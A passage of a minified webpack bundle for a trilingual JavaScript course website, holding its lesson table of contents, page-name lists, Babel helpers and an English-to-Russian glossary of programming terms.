присваивания"},{ref:"Conditional-operators",ua:"Умовні оператори",eng:"Conditional operators",ru:"Условные операторы"},{ref:"Increment",ua:"Інкремент",eng:"Increment",ru:"Инкремент"},{ref:"switch",ua:"Оператор switch",eng:"The 'switch' operator",ru:"Оператор switch"},{ref:"for",ua:"Оператор for",eng:"The 'for' operator",ru:"Оператор for"},{ref:"while",ua:"Цикли while | do ... while",eng:"while | do ... while",ru:"Циклы while | do ... while"},{ref:"for-of-for-in",ua:"Цикли for...of | for...in",eng:"for...of | for...in",ru:"Циклы for...of | for...in"},{ref:"hw-operators",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"type-coercion",ua:"Приведення типів.",eng:"Type coercion.",ru:"Приведение типов.",items:[{ref:"Explicit-type-conversion",ua:"Явне приведення типів",eng:"Explicit type coercion",ru:"Явное приведение типов"},{ref:"Implicit-type-conversion",ua:"Неявне приведення типів",eng:"Implicit type coercion",ru:"Неявное приведение типов"},{ref:"NaN-null-Infinity",ua:"NaN | null | Infinity",eng:"NaN | null | Infinity",ru:"NaN | null | Infinity"},{ref:"BigInt",ua:"BigInt (ES10)",eng:"BigInt (ES10)",ru:"BigInt (ES10)"},{ref:"literals",ua:"Змінні в літералах",eng:"Variables in literals",ru:"Переменные в литералах"},{ref:"hw-type-coercion",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"function",ua:"Методи.",eng:"Methods.",ru:"Методы",items:[{ref:"methods",ua:"Методи",eng:"Methods",ru:"Методы"},{ref:"String-methods",ua:"Методи рядків",eng:"Methods of strings",ru:"Методы строк"},{ref:"String-fromCharCode",ua:"String.fromCharCode()",eng:"String.fromCharCode()",ru:"String.fromCharCode()"},{ref:"UTF-8",ua:"UTF-8",eng:"UTF-8",ru:"UTF-8"},{ref:"Array-methods",ua:"Методи масивів",eng:"Methods of arrays",ru:"Методы массивов"},{ref:"Date-constructor",ua:"Конструктор Date",eng:"Constructor Date",ru:"Конструктор Date"},{ref:"self-work-02",ua:"Самостійна робота",eng:"Self-study",ru:"Самостоятельная работа"},{ref:"practice-with-XSS",ua:"Практика (XSS)",eng:"Practice (XSS)",ru:"Практика (XSS)"},{ref:"hw-functions",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"function-object",ua:"Функція як об'єкт",eng:"Function as an object",ru:"Функция как объект",items:[{ref:"function-object",ua:"Функція як об'єкт",eng:"Function as an object",ru:"Функция как объект"},{ref:"practice-03",ua:"Практика",eng:"Practice",ru:"Практика"},{ref:"hw-03",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"prototypal-inheritance",ua:"Прототипне наслідування",eng:"Prototypal inheritance",ru:"Прототипное наследование",items:[{ref:"native-and-host-objects",ua:"Об'єкти JS",eng:"Native and host objects",ru:"Объекты JS"},{ref:"inheritance-model",ua:"Модель успадкування JS",eng:"JS inheritance model",ru:"Модель наследования JS"},{ref:"value-of",ua:"Метод valueOf()",eng:"The 'valueOf' method",ru:"Метод valueOf()"},{ref:"in-operator",ua:"Оператор in",eng:"The 'in' operator",ru:"Оператор in"},{ref:"Error",ua:"Конструктор Error",eng:"Constructor Error",ru:"Конструктор Error"},{ref:"hw-04",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"Change-call-context",ua:"Зміна контексту. Замикання",eng:"Changing call context. Closure",ru:"Изменение контекста. Замыкание",items:[{ref:"get-and-set",ua:"Обчислювані властивості",eng:"Computed properties",ru:"Вычисляемые свойства"},{ref:"call-apply-bind",ua:"Зміна контексту виклику",eng:"Changing the call context",ru:"Изменение контекста вызова"},{ref:"Closure",ua:"Замикання",eng:"Closure",ru:"Замыкание"},{ref:"hw-05",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"functional-programming-stuff",ua:"Функціональщина",eng:"Functional stuff",ru:"Функциональщина",items:[{ref:"arrow-function",ua:"Стрілочні функції",eng:"Arrow functions",ru:"Стрелочные функции"},{ref:"functionality",ua:"Функціональщина",eng:"Functional programming stuff",ru:"Функциональщина"},{ref:"recursion",ua:"Рекурсія",eng:"Recursion",ru:"Рекурсия"},{ref:"call-apply-bind-currying",ua:"Каррування",eng:"Currying",ru:"Каррирование"},{ref:"hw-08",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"browser-object-model",ua:"BOM & DOM",eng:"BOM & DOM",ru:"BOM & DOM",items:[{ref:"BOM",ua:"Об'єктна модель браузера",eng:"Browser Object Model",ru:"Объектная модель браузера"},{ref:"DOM",ua:"Об'єктна модель документа",eng:"Document Object Model",ru:"Объектная модель документа"},{ref:"DOM-elements",ua:"Елементи DOM",eng:"DOM elements",ru:"Элементы DOM"},{ref:"hw-06",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"async-staff",ua:"Асинхронщина",eng:"Async staff",ru:"Асинхронщина",items:[{ref:"Event-Loop",ua:"Event Loop",eng:"Event Loop",ru:"Event Loop"},{ref:"Timers",ua:"Таймери",eng:"Timers",ru:"Таймеры"},{ref:"BOM-postMessage",ua:"window.postMessage",eng:"window.postMessage",ru:"window.postMessage"},{ref:"DOM-events",ua:"Події елементів DOM",eng:"DOM events",ru:"События элементов DOM"},{ref:"DOM-MutationObserver",ua:"MutationObserver",eng:"MutationObserver",ru:"MutationObserver"},{ref:"forms",ua:"Елементи форм",eng:"Form elements",ru:"Элементы форм"},{ref:"hw-07",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"dom-events",ua:"Події об'єктів DOM",eng:"DOM events",ru:"События объектов DOM",items:[]},{ref:"functional-programming-stuff",ua:"Замикання. Рекурсія. Таймери.",eng:"Closures. Recursion. Timers.",ru:"Замыкание. Рекурсия. Таймеры.",items:[{ref:"arrow-function",ua:"Стрілочні функції",eng:"Arrow functions",ru:"Стрелочные функции"},{ref:"functionality",ua:"Функціональщина",eng:"Functional programming stuff",ru:"Функциональщина"},{ref:"Closure",ua:"Замикання",eng:"Closure",ru:"Замыкание"},{ref:"recursion",ua:"Рекурсія",eng:"Recursion",ru:"Рекурсия"},{ref:"hw-08",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"array-iterating-methods",ua:"Ітерування масивів. SHA",eng:"Array iterating methods. SHA",ru:"Итерирование массивов. SHA",items:[{ref:"Array-iterating-methods",ua:"Ітеруючі методи масивів",eng:"Array iterating methods",ru:"Итерирующие методы массивов"},{ref:"JS-heap-memory-allocation",ua:"Тестування продуктивності",eng:"Heap memory allocation",ru:"Тестирование производительности"},{ref:"throttling-and-debouncing",ua:"Throttling and debouncing",eng:"Throttling and debouncing",ru:"Throttling and debouncing"},{ref:"SHA",ua:"Secure Hash Algorithm",eng:"Secure Hash Algorithm",ru:"Secure Hash Algorithm"},{ref:"hw-09",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"object-static-props",ua:"Статичні методи конструктора Object",eng:"Static methods of the Object constructor",ru:"Статические методы конструктора Object",items:[{ref:"let-const",ua:"let | const",eng:"let | const",ru:"let | const"},{ref:"Object-static-props",ua:"Статичні методи конструктора Object",eng:"Static methods of the Object constructor",ru:"Статические методы конструктора Object"},{ref:"hw-10",ua:"Homework",ru:"Homework",eng:"Homework"}]},{ref:"ajax-promise",ua:"AJAX. Promise",eng:"AJAX. Promise",ru:"AJAX. Promise",items:[{ref:"JSON",ua:"JSON",eng:"JSON",ru:"JSON"},{ref:"curl",ua:"Утиліта curl",eng:"Command-line utility curl",ru:"Утилита командной строки curl"},{ref:"XMLHttpRequest",ua:"XMLHttpRequest",eng:"XMLHttpRequest",ru:"XMLHttpRequest"},{ref:"Content-Type",ua:"Заголовок Content-Type",eng:"Content-Type header",ru:"Заголовок Content-Type"},{ref:"promise",ua:"Promise",eng:"Promise",ru:"Promise"},{ref:"promise-constructor",ua:"Конструктор Promise",eng:"Promise constructor",ru:"Конструктор Promise"},{ref:"hw-11",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"fetch-cors",ua:"Fetch API. CORS",eng:"Fetch API. CORS",ru:"Fetch API. CORS",items:[{ref:"fetch-API",ua:"Fetch API",eng:"Fetch API",ru:"Fetch API"},{ref:"CORS",ua:"CORS",eng:"CORS",ru:"CORS"},{ref:"cookie",ua:"cookie",eng:"cookie",ru:"cookie"},{ref:"localStorage",ua:"localStorage",eng:"localStorage",ru:"localStorage"},{ref:"hw-12",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"file-api-and-formdata",ua:"File API. FormData",eng:"File API. FormData",ru:"File API. FormData",items:[{ref:"named-item",ua:"namedItem",eng:"namedItem",ru:"namedItem"},{ref:"readableStream",ua:"Streams API",eng:"Streams API",ru:"Streams API"},{ref:"arrayBuffer",ua:"ArrayBuffer",eng:"ArrayBuffer",ru:"ArrayBuffer"},{ref:"FileReader",ua:"FileReader",eng:"FileReader",ru:"FileReader"},{ref:"File-API",ua:"File API",eng:"File API",ru:"File API"},{ref:"FormData",ua:"FormData",eng:"FormData",ru:"FormData"},{ref:"hw-13",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"asynchronous-function",ua:"Асинхронна функція",eng:"Asynchronous function",ru:"Асинхронная функция",items:[{ref:"Event-Loop",ua:"Event Loop",eng:"Event Loop",ru:"Event Loop"},{ref:"async-is-good",ua:"Чим корисні обіцянки?",eng:"Why are promises good?",ru:"Чем хороши обещания?"},{ref:"async-await",ua:"async | await",eng:"async | await",ru:"async | await"},{ref:"async-constructor",ua:"Конструктор асинхронної функції",eng:"Asynchronous function constructor",ru:"Конструктор асинхронной функции"},{ref:"async-vs-Promise-all",ua:"async function vs Promise.all",eng:"async function vs Promise.all",ru:"async function vs Promise.all"},{ref:"hw-14",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"rest-api",ua:"REST API",eng:"REST API",ru:"REST API",items:[{ref:"API",ua:"API",eng:"API",ru:"API"},{ref:"REST",ua:"REST API",eng:"REST API",ru:"REST API"},{ref:"REST-status",ua:"Код статусу відповіді сервера",eng:"Response status codes",ru:"Код статуса ответа сервера"},{ref:"JSON-placeholder",ua:"JSON-placeholder",eng:"JSON-placeholder",ru:"JSON-placeholder"},{ref:"json-server",ua:"json-server",eng:"json-server",ru:"json-server"},{ref:"fake-chat",ua:"Fake chat",eng:"Fake chat",ru:"Fake chat"},{ref:"hw-15",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"classes",ua:"Класи",eng:"Classes",ru:"Классы",items:[{ref:"strict-mode",ua:"Strict mode",eng:"Strict mode",ru:"Строгий режим"},{ref:"computed-prop-names",ua:"Обчислювані імена властивостей",eng:"Computed property names",ru:"Вычисляемые имена свойств"},{ref:"short-method-syntax",ua:"Короткий синтаксис методів",eng:"Short method syntax",ru:"Краткий синтаксис методов"},{ref:"shorthand-object-literal",ua:"Коротка форма літерала об'єкта",eng:"Shorthand object literal",ru:"Краткая форма литерала объекта"},{ref:"Classes",ua:"Класи",eng:"Classes",ru:"Классы"},{ref:"hw-16",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"generators-and-iterators",ua:"Генератори та ітератори",eng:"Generators and iterators",ru:"Генераторы и итераторы",items:[{ref:"fabric",ua:"Фабричні методи. Поліморфізм",eng:"Factory method. Polymorphism",ru:"Фабричные методы. Полиморфизм"},{ref:"Destructuring",ua:"Деструктуризація",eng:"Destructuring",ru:"Деструктуризация"},{ref:"generators",ua:"Генератори та ітератори",eng:"Generators and iterators",ru:"Генераторы и итераторы"},{ref:"generators-async",ua:"Асинхронні генератори",eng:"Asynchronous generators",ru:"Асинхронные генераторы"},{ref:"generators-yield",ua:"Зміна протоколу ітерування (yield*)",eng:"Switching the iteration protocol (yield*)",ru:"Изменение протокола итерирования (yield*)"},{ref:"generators-arg",ua:"Передача параметрів генератору",eng:"Passing parameters to a generator",ru:"Передача параметров генератору"},{ref:"hw-17",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"web-components",ua:"Веб-компоненти",eng:"Web-components",ru:"Веб-компоненты",items:[{ref:"not-defined",ua:"Селектор :not(:defined)",eng:"Selector :not(:defined)",ru:"Селектор :not(:defined)"},{ref:"Shadow-DOM",ua:"Shadow DOM",eng:"Shadow DOM",ru:"Shadow DOM"},{ref:"custom-elements",ua:"Custom Elements",eng:"Custom Elements",ru:"Custom Elements"},{ref:"life-cycle-hooks",ua:"Хуки життєвого циклу",eng:"Lifecycle hooks",ru:"Хуки жизненного цикла"},{ref:"when-defined",ua:"whenDefined",eng:"whenDefined",ru:"whenDefined"},{ref:"template",ua:"&lt;template&gt;",eng:"&lt;template&gt;",ru:"&lt;template&gt;"},{ref:"slots",ua:"Слоти",eng:"Slots",ru:"Слоты"},{ref:"web-component-samples",ua:"Приклади веб-компонентів",eng:"Web-component examples",ru:"Примеры веб-компонентов"},{ref:"hw-18",ua:"Homework",eng:"Homework",ru:"Homework"}]},{ref:"webpack",ua:"Webpack",eng:"Webpack",ru:"Webpack",items:[{ref:"npm",ua:"Пакетний менеджер npm",eng:"Package manager npm",ru:"Пакетный менеджер npm"},{ref:"webpack",ua:"Webpack",eng:"Webpack",ru:"Webpack"},{ref:"webpack-es-modules",ua:"ES Modules",eng:"ES Modules",ru:"ES Modules"},{ref:"dynamic-import",ua:"Dynamic import (ES10)",eng:"Dynamic import (ES10)",ru:"Dynamic import (ES10)"},{ref:"webpack-mode",ua:"Опція --mode",eng:"--mode option",ru:"Опция --mode"},{ref:"webpack-package-json",ua:"package.json",eng:"package.json",ru:"package.json"},{ref:"webpack-css-loaders",ua:"Завантажувачі стилів",eng:"Style loaders",ru:"Загрузчики стилей"},{ref:"webpack-exercise-6",ua:"Завантажувачі файлів",eng:"File loaders",ru:"Загрузчики файлов"},{ref:"webpack-exercise-7",ua:"Іменований експорт",eng:"Named export",ru:"Именованный экспорт"},{ref:"webpack-exercise-8",ua:"Впровадження шрифтів",eng:"Embedding fonts",ru:"Подключение шрифтов"}]},{ref:"final-project",ua:"Final project",eng:"Final project",ru:"Final project",items:[{ref:"Final-project",ua:"Завдання на проектування",eng:"Design task",ru:"Задание на проектирование"}]},{ref:"other-important",ua:"Other important",eng:"Other important",ru:"Other important",items:[{ref:"Symbol",ua:"Symbol",eng:"Symbol",ru:"Symbol"},{ref:"Set",ua:"Конструктор Set",eng:"Set constructor",ru:"Конструктор Set"}]},{ref:"design-patterns",ua:"Design Patterns",eng:"Design Patterns",ru:"Design Patterns",items:[{ref:"patterns",ua:"Design Patterns",eng:"Design Patterns",ru:"Design Patterns"},{ref:"pattern-Observer",ua:"Pattern Observer",eng:"Pattern Observer",ru:"Паттерн Observer"},{ref:"pattern-Decorator",ua:"Pattern Decorator",eng:"Pattern Decorator",ru:"Паттерн Decorator"},{ref:"pattern-Strategy",ua:"Pattern Strategy",eng:"Pattern Strategy",ru:"Паттерн Strategy"}]},{ref:"indexed-db",ua:"IndexedDB",eng:"IndexedDB",ru:"IndexedDB",items:[{ref:"IndexedDB",ua:"ruBFactory API",eng:"ruBFactory API",ru:"ruBFactory API"},{ref:"IndexedDB-store",ua:"Сховища даних IndexedDB",eng:"IndexedDB store",ru:"Хранилища данных IndexedDB"},{ref:"IndexedDB-index",ua:"ruBIndex",eng:"ruBIndex",ru:"ruBIndex"},{ref:"IndexedDB-transaction",ua:"Transaction",eng:"Transaction",ru:"Transaction"},{ref:"NoSQL",ua:"Засади баз даних",eng:"Database basics",ru:"Основы баз данных"}]},{ref:"additional-material",ua:"Додатковий матеріал",eng:"Additional material",ru:"Дополнительный материал",items:[{ref:"throttling-and-debouncing",ua:"Throttling and debouncing",eng:"Throttling and debouncing",ru:"Throttling and debouncing"},{ref:"SOLID",ua:"Принципи SOLID",eng:"SOLID principles",ru:"Принципы SOLID"},{ref:"web-workers",ua:"Web-workers",eng:"Web-workers",ru:"Web-workers"},{ref:"NotificationAPI",ua:"Notification API",eng:"Notification API",ru:"Notification API"},{ref:"performance",ua:"Performance API",eng:"Performance API",ru:"Performance API"},{ref:"web-socket",ua:"Web-socket",eng:"Web-socket",ru:"Web-socket"}]},{ref:"reference-material",ua:"Довідковий матеріал",eng:"Reference material",ru:"Справочный материал",items:[{ref:"git",ua:"Git",eng:"Git",ru:"Git"},{ref:"git-bash",ua:"Git Bash",eng:"Git Bash",ru:"Git Bash"},{ref:"tcp-ip",ua:"TCP/IP",eng:"TCP/IP",ru:"TCP/IP"},{ref:"localhost",ua:"localhost",eng:"localhost",ru:"localhost"}]},{ref:"ecma-script",ua:"ECMAScript",eng:"ECMAScript",ru:"ECMAScript",items:[{ref:"ECMA",ua:"ECMAScript® Language Specification",eng:"ECMAScript® Language Specification",ru:"ECMAScript® Language Specification"}]}]},70563:(n,e,_)=>{"use strict";_.r(e),_.d(e,{eng:()=>t});var t=["404","API","Array-iterating-methods-theory","Array-iterating-methods","arrayBuffer","arrow-function","async-await","Block-diagram","Boolean","Chrome-dev-tools","data-structures","dynamic-import","Event-Loop","for","function","JSON","pattern-Observer","pattern-Strategy","promise","start-page","Timers","var","while"]},82627:(n,e,_)=>{"use strict";function t(n){return t="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},t(n)}function o(n,e,_){return(e=function(n){var e=function(n){if("object"!=t(n)||!n)return n;var e=n[Symbol.toPrimitive];if(void 0!==e){var _=e.call(n,"string");if("object"!=t(_))return _;throw new TypeError("@@toPrimitive must return a primitive value.")}return String(n)}(n);return"symbol"==t(e)?e:e+""}(e))in n?Object.defineProperty(n,e,{value:_,enumerable:!0,configurable:!0,writable:!0}):n[e]=_,n}function r(n){return function(n){if(Array.isArray(n))return s(n)}(n)||function(n){if("undefined"!=typeof Symbol&&null!=n[Symbol.iterator]||null!=n["@@iterator"])return Array.from(n)}(n)||function(n,e){if(n){if("string"==typeof n)return s(n,e);var _={}.toString.call(n).slice(8,-1);return"Object"===_&&n.constructor&&(_=n.constructor.name),"Map"===_||"Set"===_?Array.from(n):"Arguments"===_||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(_)?s(n,e):void 0}}(n)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function s(n,e){(null==e||e>n.length)&&(e=n.length);for(var _=0,t=Array(e);_<e;_++)t[_]=n[_];return t}_.r(e),_.d(e,{default:()=>l});var a=_(44829),i=a.keys().filter((function(n){return"./"!==n&&"./index"!==n&&"./index.js"!==n})),c=Object.assign.apply(Object,[{}].concat(r(i.map((function(n){return o({},n.split("./").join("").split(".js").join(""),a(n))})))));const l=Object.assign.apply(Object,[{}].concat(r(Object.keys(c).map((function(n){return o({},n,c[n][n])})))))},34127:(n,e,_)=>{"use strict";_.r(e),_.d(e,{pages:()=>t});var t=["404","API","Array-iterating-methods-theory","Array-iterating-methods","Array-methods","arrayBuffer","arrow-function","Assignments","async-await","async-constructor","async-is-good-eng","async-is-good","async-vs-Promise-all","BigInt","Block-diagram","BOM-postMessage","BOM","Boolean","call-apply-bind-currying","call-apply-bind","Chrome-dev-tools","Classes","Closure","computed-prop-names","Conditional-operators","Content-Type","Context","cookie","CORS","curl","custom-elements","data-structures","Date-constructor","default-param-values","Destructuring","Developer-tools","DOM-elements","DOM-events-eng","DOM-events","DOM-MutationObserver-eng","DOM-MutationObserver","DOM","dynamic-import","ECMA","Error","Event-Loop","Explicit-type-conversion","fabric","fake-chat","fetch-API","File-API","FileReader","Final-project","for-of-for-in","for","FormData","forms","function-object-eng","function-object","function","generators-arg","generators-async","generators-yield","generators","get-and-set","git-bash","git","hw-02","hw-03","hw-04","hw-05","hw-06","hw-07","hw-08","hw-09","hw-10","hw-11","hw-12","hw-13","hw-14","hw-15","hw-16","hw-17","hw-18","hw-flowchart","Implicit-type-conversion","in-operator","Increment","IndexedDB-index","IndexedDB-store","IndexedDB-transaction","IndexedDB","inheritance-model","JS-heap-memory-allocation","JSON-placeholder","json-server","JSON","let-const","life-cycle-hooks","literals","localhost","localStorage","Map","methods","named-item","NaN-null-Infinity","native-and-host-objects","NoSQL","not-defined","NotificationAPI","npm","Object-static-props","pattern-Decorator","pattern-Observer","pattern-Strategy","patterns","performance","practice-03","practice-with-XSS","promise-constructor","promise","Proxy","readableStream","recursion","REST-status","REST","scroll","self-work-02","Set","SHA","Shadow-DOM","short-method-syntax","shorthand-object-literal","slots","SOLID","start-page","strict-mode","String-fromCharCode","String-methods","switch","Symbol","tcp-ip","template","throttling-and-debouncing","Timers","typeof","UTF-8","value-of","var","web-component-samples","web-socket","web-soket","web-workers","webpack-css-loaders","webpack-es-modules","webpack-exercise-6","webpack-exercise-7","webpack-exercise-8","webpack-mode","webpack-package-json","webpack","when-defined","while","XMLHttpRequest"]},68426:(n,e,_)=>{"use strict";_.r(e),_.d(e,{ru:()=>t});var t=["404","API","Array-iterating-methods-theory","Array-iterating-methods","Array-methods","arrayBuffer","arrow-function","Assignments","async-await","async-constructor","async-is-good-eng","async-is-good","async-vs-Promise-all","BigInt","Block-diagram","BOM-postMessage","BOM","Boolean","call-apply-bind-currying","call-apply-bind","Chrome-dev-tools","Classes","Closure","computed-prop-names","Conditional-operators","Content-Type","Context","cookie","CORS","curl","custom-elements","data-structures","Date-constructor","default-param-values","Destructuring","Developer-tools","DOM-elements","DOM-events-eng","DOM-events","DOM-MutationObserver-eng","DOM-MutationObserver","DOM","dynamic-import","ECMA","Error","Event-Loop","Explicit-type-conversion","fabric","fake-chat","fetch-API","File-API","FileReader","Final-project","for-of-for-in","for","FormData","forms","function-object-eng","function-object","function","generators-arg","generators-async","generators-yield","generators","get-and-set","git-bash","git","hw-02","hw-03","hw-04","hw-05","hw-06","hw-07","hw-08","hw-09","hw-10","hw-11","hw-12","hw-13","hw-14","hw-15","hw-16","hw-17","hw-18","hw-flowchart","Implicit-type-conversion","in-operator","Increment","IndexedDB-index","IndexedDB-store","IndexedDB-transaction","IndexedDB","inheritance-model","JS-heap-memory-allocation","JSON-placeholder","json-server","JSON","let-const","life-cycle-hooks","literals","localhost","localStorage","Map","methods","named-item","NaN-null-Infinity","native-and-host-objects","NoSQL","not-defined","NotificationAPI","npm","Object-static-props","pattern-Decorator","pattern-Observer","pattern-Strategy","patterns","performance","practice-03","practice-with-XSS","promise-constructor","promise","Proxy","readableStream","recursion","REST-status","REST","scroll","self-work-02","Set","SHA","Shadow-DOM","short-method-syntax","shorthand-object-literal","slots","SOLID","start-page","strict-mode","String-fromCharCode","String-methods","switch","Symbol","tcp-ip","template","throttling-and-debouncing","Timers","typeof","UTF-8","value-of","var","web-component-samples","web-socket","web-soket","web-workers","webpack-css-loaders","webpack-es-modules","webpack-exercise-6","webpack-exercise-7","webpack-exercise-8","webpack-mode","webpack-package-json","webpack","when-defined","while","XMLHttpRequest"]},75775:(n,e,_)=>{"use strict";var t;function o(n){return o="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},o(n)}function r(n,e,_){return(e=function(n){var e=function(n){if("object"!=o(n)||!n)return n;var e=n[Symbol.toPrimitive];if(void 0!==e){var _=e.call(n,"string");if("object"!=o(_))return _;throw new TypeError("@@toPrimitive must return a primitive value.")}return String(n)}(n);return"symbol"==o(e)?e:e+""}(e))in n?Object.defineProperty(n,e,{value:_,enumerable:!0,configurable:!0,writable:!0}):n[e]=_,n}_.r(e),_.d(e,{translations:()=>s});var s=(r(r(r(r(r(r(r(r(r(r(t={algorithm:"алгоритм",fibonacci:"фибоначчи",sequence:"ряд",flowchart:"блок-схема","flowchart of the algorithm":"блок-схема алгоритма",developer:"разработчик",tools:"инструменты","developer tools":"инструменты разработчика",console:"консоль",browser:"браузер"},"sequence","последовательность"),"branching","ветвление"),"loop","цикл"),"cycle","цикл"),"loop variable","переменная цикла"),"counter","счетчик"),"condition","условие"),"variable","переменная"),"data types","типы данных"),"function","функция"),r(r(r(r(r(r(r(r(r(r(t,"array","массив"),"element","элемент"),"object","объект"),"number","число"),"string","строка"),"boolean","логическое значение"),"typing","типизация"),"dynamic typing","динамическая типизация"),"literal","литерал"),"value","значение"),r(r(r(r(r(r(r(r(r(r(t,"primitive value","примитивное значение"),"calculated","вычисляемый"),"assignment","присваивание"),"arithmetic operations","арифметические операции"),"increment","инкремент"),"decrement","декремент"),"prefix form","префиксная форма"),"postfix form","пост-префиксная форма"),"operator","оператор"),"operand","операнд"),r(r(r(r(r(r(r(r(r(r(t,"concatenation","конкатенация"),"comparison operator","оператор сравнения"),"logical operations","логические операции"),"logical expression","логическое выражение"),"conditional operator","условный оператор"),"ternary operator","тернарный оператор"),"loop operator","оператор цикла"),"strict equality","строгое равенство"),"functional expression","функциональное выражение"),"linked list","связные списки"),r(r(r(r(r(r(r(r(r(r(t,"selector","селектор"),"shadow","тень"),"custom","кастомный"),"type coercion","приведение типов"),"Explicit type coercion",""),"Implicit type coercion",""),"bitwise operations","битовые операции"),"remainder","остаток от деления"),"string methods","методы строк"),"array methods","методы массивов"),r(r(r(r(r(r(r(r(r(r(t,"function declaration","объявление функции"),"function expression","функциональное выражение"),"parameters","параметры"),"arguments","аргументы"),"formal parameters","формальные параметры"),"default parameter values","дефолтные значения параметров"),"call","вызов"),"function call","вызов функции"),"context","контекст"),"call context","контекст вызова"),r(r(r(r(r(r(r(r(r(r(t,"execution context","контекст исполнения"),"scope","область видимости"),"scope chain","цепочка областей видимости"),"global object","глобальный объект"),"symbol","символ"),"global","глобальный"),"registry","реестр"),"pattern","паттерн"),"template","шаблон"),"default","дефолтный"),r(r(r(r(r(r(r(r(r(r(t,"encoding table","кодировочная таблица"),"character code","код символа"),"variables in a literal","переменные в литерале"),"multiline text","многострочный текст"),"code injection","инъекции кода"),"iteration protocol","протокол итерирования"),"iteration","итерирование"),"iterable","итерабельный"),"iterator","итератор"),"traversal","перебор"),r(r(r(r(r(r(r(r(r(r(t,"structure","структура"),"data structure","структурa данных"),"data structure depth","глубина структуры данных"),"deep copy","глубокое копирование"),"constructor","конструктор"),"instance","экземпляр"),"property","свойство"),"descriptor","дескриптор"),"native objects","нативные объекты"),"host objects","хост-объекты"),r(r(r(r(r(r(r(r(r(r(t,"object literal","литерал объекта"),"arrow function","стрелочная функция"),"encapsulation","инкапсуляция"),"reference","ссылка"),"inherited","унаследованный"),"own","собственный"),"public","публичный"),"private","приватный"),"computed","вычисляемый"),"getter","геттер"),r(r(r(r(r(r(r(r(r(r(t,"setter","сеттер"),"own property","собственное свойство"),"inherited property","унаследованное свойство"),"private property","приватное свойство"),"public property","публичное свойство"),"computed properties","вычисляемые свойства"),"prototype","прототип"),"prototype chain","цепочка прототипов"),"enumerable","перечислимое"),"non-enumerable","неперечислимое"),r(r(r(r(r(r(r(r(r(r(t,"delegation","делегирование"),"design","проектирование"),"strategy","стратегия"),"OOP","ООП"),"inheritance","наследование"),"polymorphism","полиморфизм"),"factory method","фабричный метод"),"factory","фабрика"),"pattern","паттерн"),"currying","каррирование"),r(r(r(r(r(r(r(r(r(r(t,"binding","биндинг"),"changing the call context","изменение контекста вызова"),"context switching","изменение контекста"),"decorator","декоратор"),"gang of four","банда четырех"),"technical specifications","ТЗ"),"ts","ТЗ"),"project","проект"),"descendants","потомки"),"parent","родитель"),r(r(r(r(r(r(r(r(r(r(t,"collection","коллекция"),"insertion","вставка"),"removal","удаление"),"tree","дерево"),"content","контент"),"example","пример"),"drop-down list","выпадающий список"),"switches","переключатели"),"closure","замыкание"),"recursion","рекурсия"),r(r(r(r(r(r(r(r(r(r(t,"recursive","рекурсивная"),"tail recursion","хвостовая рекурсия"),"recursion depth","глубина рекурсии"),"recursion termination condition","условие прерывания рекурсии"),"call stack","стек вызовов"),"event-driven programming","событийно-ориентированное программирование"),"event loop","цикл событий"),"event","событие"),"thread","поток"),"process","процесс"),r(r(r(r(r(r(r(r(r(r(t,"heap","куча"),"asynchrony","асинхронность"),"callback","обратный вызов"),"microtask","микротаск"),"task queue","очередь задач"),"event queue","очередь событий"),"multithreading","многопоточность"),"single-threading","однопоточность"),"parallel thread","параллельный поток"),"core","ядро"),r(r(r(r(r(r(r(r(r(r(t,"processor","процессор"),"engine","движок"),"promise","промис"),"asynchronous function","асинхронная функция"),"domen","домен"),"cross domain","кросс-доменный"),"expiration date","срок годности"),"proxy","прокси"),"accessor","аксессор"),"transformation","преобразование"),r(r(r(r(r(r(r(r(r(r(t,"page refresh rate","частота обновления страницы"),"timer","таймер"),"signature","сигнатура"),"mutation","мутации"),"observer","обозреватель"),"options","опции"),"server","сервер"),"header","заголовок"),"remote","удаленный"),"soket","сокет"),r(r(r(r(r(r(r(r(r(r(t,"repository","репозиторий"),"repo","репозиторий"),"principle","принцип"),"hash","хеш"),"digest","дайджест"),"digital signature","цифровая подпись"),"functional programming","функциональное программирование"),"func stuff","функциональщина"),"functional vibes","функциональщина"),"higher-order function","функция высшего порядка"),r(r(r(r(r(r(r(r(r(r(t,"function as argument","функция-аргумент"),"function as return value","функция-возвращаемое значение"),"self-invocation","самовызов"),"immutability","иммутабельность"),"logging","логирование"),"temporal dead zone",'временная "мёртвая зона"'),"initialization","инициализация"),"block scope","блочная область видимости"),"functional scope","функциональная область видимости"),"hoisting","поднятие"),r(r(r(r(r(r(r(r(r(r(t,"exception","исключение"),"request","запрос"),"response","ответ"),"connect","соединяться"),"connection","соединение"),"service","сервис"),"protocol","протокол"),"interface","интерфейс"),"resource","ресурс"),"operation","операция"),r(r(r(r(r(r(r(r(r(r(t,"hook","хук"),"database","база данных"),"transaction","транзакция"),"relational","реляционный"),"tables","таблицы"),"normalization","нормализация"),"denormalization","денормализация"),"distributed system","распределённая 